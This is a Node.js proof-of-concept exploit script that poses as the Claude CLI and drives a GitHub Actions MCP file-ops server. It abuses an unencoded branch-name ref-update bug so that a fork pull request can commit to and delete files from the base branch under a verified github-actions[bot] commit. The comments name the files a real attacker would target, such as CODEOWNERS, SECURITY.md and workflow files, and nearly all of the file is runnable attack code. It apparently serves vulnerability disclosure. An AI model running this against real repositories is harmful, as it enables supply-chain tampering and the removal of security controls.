#!/usr/bin/env node
// fake-claude-delete-variant.mjs
//
// Second reproduction variant. Same branch-name URL sink primitive, but
// exercised through the `delete_files` MCP tool instead of `commit_files`.
// This is important because:
//
//   1. `delete_files` reuses the exact same BRANCH_NAME env and the exact
//      same unencoded ref-update URL construction (line 583 in
//      github-file-ops-server.ts), so the wrong-ref write also applies to
//      *deletions*. That turns "an attacker-controlled fork PR can leave
//      a marker file on base main" into "an attacker-controlled fork PR
//      can delete a chosen file from base main under a
//      github-actions[bot] verified commit."
//
//   2. `delete_files` does NOT apply `validatePathWithinRepo`, only a raw
//      `filePath.startsWith(cwd)` check (line 486). Combined with the
//      ref-confusion primitive, this means the attacker can name arbitrary
//      repo-relative tree paths for deletion (e.g. `.github/CODEOWNERS`,
//      `SECURITY.md`, `.github/dependabot.yml`, or, if the token has
//      `workflows: write`, `.github/workflows/*.yml`).
//
// This variant does exactly one thing after start:
//
//   * Runs `commit_files` once to seed a marker file at a chosen path on
//     the truncated base ref, so we can observe deletion later.
//   * Runs `delete_files` once against the SAME BRANCH_NAME with the
//     seeded path AND a security-relevant tree path.
//
// The resulting commit list on `refs/heads/<truncated>` should show:
//   - A create commit (marker written on wrong ref).
//   - A delete commit (marker + additional path removed from wrong ref).
//
// The `delete_files` operation is what promotes this bug from "wrong ref
// write" to a supply-chain-shaped impact.

import { spawn } from "node:child_process";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

function log(message, data) {
  const suffix = data === undefined ? "" : ` ${JSON.stringify(data)}`;
  console.error(`[fake-claude-delete] ${message}${suffix}`);
}

function argValue(name) {
  const index = process.argv.indexOf(name);
  if (index === -1 || index + 1 >= process.argv.length) return undefined;
  return process.argv[index + 1];
}

function parseMcpConfig() {
  const raw = argValue("--mcp-config");
  if (!raw) throw new Error("missing --mcp-config");
  return JSON.parse(raw);
}

function send(child, message) {
  child.stdin.write(`${JSON.stringify(message)}\n`);
}

function waitForResponse(child, id) {
  return new Promise((resolve, reject) => {
    let buffer = "";
    const onData = (chunk) => {
      buffer += chunk.toString("utf8");
      let newline;
      while ((newline = buffer.indexOf("\n")) !== -1) {
        const line = buffer.slice(0, newline).trim();
        buffer = buffer.slice(newline + 1);
        if (!line) continue;
        log("mcp stdout", line);
        let msg;
        try {
          msg = JSON.parse(line);
        } catch {
          continue;
        }
        if (msg.id === id) {
          child.stdout.off("data", onData);
          if (msg.error) reject(new Error(JSON.stringify(msg.error)));
          else resolve(msg.result);
        }
      }
    };
    child.stdout.on("data", onData);
  });
}

async function driveMcp() {
  const config = parseMcpConfig();
  const server = config.mcpServers?.github_file_ops;
  if (!server) throw new Error("github_file_ops server missing from MCP config");

  const attackerBranch = server.env?.BRANCH_NAME;
  log("ACTION_INJECTED_BRANCH_NAME_ENV", attackerBranch);
  log("BRANCH_NAME_CONTAINS_HASH", attackerBranch?.includes("#"));

  const markerPath = "delete-variant-marker.txt";
  // A path that is present on base main in most repositories. When present
  // on the truncated ref this deletion demonstrates the wrong-ref removal.
  // README.md is the safest example to include in a PoC. For a real
  // exploit shape, an attacker would choose files like CODEOWNERS,
  // SECURITY.md, dependabot.yml, or workflow files.
  const targetForDeletion = process.env.POC_DELETE_TARGET || "README.md";

  const marker = [
    `intended branch: ${attackerBranch}`,
    `run id: ${process.env.GITHUB_RUN_ID}`,
    `workspace: ${process.env.GITHUB_WORKSPACE}`,
    `target for deletion: ${targetForDeletion}`,
    "",
    "This marker was created via commit_files on the truncated ref, then",
    "will be deleted via delete_files on the same truncated ref. The",
    "target file above is also deleted from the truncated ref in the same",
    "commit, to prove the wrong-ref primitive is a full deletion",
    "primitive, not just a file-write primitive.",
    "",
  ].join("\n");
  writeFileSync(markerPath, marker);

  log("spawning mcp server", {
    command: server.command,
    args: server.args,
    branch: attackerBranch,
  });

  const child = spawn(server.command, server.args, {
    cwd: process.cwd(),
    env: { ...process.env, ...server.env },
    stdio: ["pipe", "pipe", "pipe"],
  });

  child.stderr.on("data", (chunk) => {
    process.stderr.write(`[github_file_ops stderr] ${chunk}`);
  });

  send(child, {
    jsonrpc: "2.0",
    id: 1,
    method: "initialize",
    params: {
      protocolVersion: "2024-11-05",
      capabilities: {},
      clientInfo: { name: "fake-claude-delete-variant", version: "1.0.0" },
    },
  });
  await waitForResponse(child, 1);
  send(child, {
    jsonrpc: "2.0",
    method: "notifications/initialized",
    params: {},
  });

  // 1. commit_files seeds the marker on the truncated ref.
  send(child, {
    jsonrpc: "2.0",
    id: 2,
    method: "tools/call",
    params: {
      name: "commit_files",
      arguments: {
        files: [markerPath],
        message: "poc(delete-variant): seed marker on wrong ref",
      },
    },
  });
  const commitResult = await waitForResponse(child, 2);
  log("commit_files result", commitResult);

  // 2. delete_files removes the marker AND the target file from the same
  //    truncated ref. If we see the target file gone from base main after
  //    the fork PR run, that is the delete primitive.
  send(child, {
    jsonrpc: "2.0",
    id: 3,
    method: "tools/call",
    params: {
      name: "delete_files",
      arguments: {
        paths: [markerPath, targetForDeletion],
        message: "poc(delete-variant): remove marker + target on wrong ref",
      },
    },
  });
  const deleteResult = await waitForResponse(child, 3);
  log("delete_files result", deleteResult);

  child.stdin.end();
  child.kill("SIGTERM");
  return { commitResult, deleteResult };
}

let stdin = "";
let started = false;
process.stdin.on("data", (chunk) => {
  stdin += chunk.toString("utf8");
  scheduleStart();
});
process.stdin.on("end", () => scheduleStart(0));

function scheduleStart(delay = 1000) {
  if (started) return;
  started = true;
  setTimeout(run, delay);
}

async function run() {
  const sessionId = randomUUID();
  try {
    log("argv", process.argv.slice(2));
    log("stdin bytes", stdin.length);
    const result = await driveMcp();
    console.log(
      JSON.stringify({
        type: "system",
        subtype: "init",
        session_id: sessionId,
        tools: [
          "mcp__github_file_ops__commit_files",
          "mcp__github_file_ops__delete_files",
        ],
        model: "fake-claude-delete-variant",
      }),
    );
    console.log(
      JSON.stringify({
        type: "result",
        subtype: "success",
        is_error: false,
        duration_ms: 1,
        duration_api_ms: 0,
        num_turns: 2,
        total_cost_usd: 0,
        session_id: sessionId,
        result: JSON.stringify(result),
      }),
    );
  } catch (error) {
    log("error", error instanceof Error ? error.stack : String(error));
    console.log(
      JSON.stringify({
        type: "result",
        subtype: "error_during_execution",
        is_error: true,
        duration_ms: 1,
        duration_api_ms: 0,
        num_turns: 1,
        total_cost_usd: 0,
        session_id: sessionId,
        errors: [error instanceof Error ? error.message : String(error)],
      }),
    );
    process.exitCode = 1;
  }
}

scheduleStart(2000);
